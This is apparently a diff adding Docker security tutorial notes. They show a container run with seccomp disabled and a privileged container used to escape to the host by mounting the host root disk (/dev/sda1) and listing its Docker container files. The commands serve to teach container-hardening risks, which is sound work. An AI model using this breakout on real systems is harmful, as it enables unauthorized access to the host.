@@ -1,0 +1,12 @@
+# This removes all seccomp security, like in previous Docker versions. How is shocker.c breakout now restricted?
+
+docker run --rm -it --security-opt seccomp:unconfined benhall/strace:latest sh
+
+# The privileged flag returns the container into a "super container" without any restrictions.
+# Once you've gained access to a priviledged container you can gain access to the host
+# For example, mounting the root disk
+
+docker run -it --privileged ubuntu bash
+df -h ## find the disk Id
+mkdir /host && mount /dev/sda1 /host
+ls /host/var/lib/docker/containers/
